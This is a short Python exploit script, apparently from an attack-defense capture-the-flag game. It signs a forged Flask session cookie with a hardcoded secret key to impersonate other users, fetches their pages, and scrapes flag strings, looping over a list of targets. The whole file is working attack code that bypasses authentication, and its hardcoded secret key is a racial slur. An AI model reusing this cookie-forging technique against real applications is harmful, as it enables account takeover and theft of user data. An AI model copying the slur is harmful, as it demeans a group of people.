#!/usr/bin/env python3
import json
import requests
import re
import sys
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

secret_key = "nigga"

def generate_flask_session(secret_key, data):
    signer_kwargs = dict(key_derivation="hmac", digest_method="sha1")
    serializer = URLSafeTimedSerializer(
        secret_key,
        salt="cookie-session",
        serializer=TaggedJSONSerializer(),
        signer_kwargs=signer_kwargs
    )
    return serializer.dumps(data)

def sploit(host: str, username: str, user_id: int, note_id: int):
    session = requests.Session()
    flask_session = generate_flask_session(secret_key, {
        "user_id": user_id,
        "username": username
    })
    session.cookies.set("session", flask_session)

    r = session.get(f"http://{host}:5000")
    flags = "\n".join(re.findall(r"[0-9A-Z]{31}=", r.text))
    print(flags, flush=True)

if __name__ == "__main__":
    host = sys.argv[1]
    from utils import attack_data
    for ad in attack_data(host):
        username, user_id, note_id = ad.split(":")
        sploit(host, username, int(user_id), int(note_id))
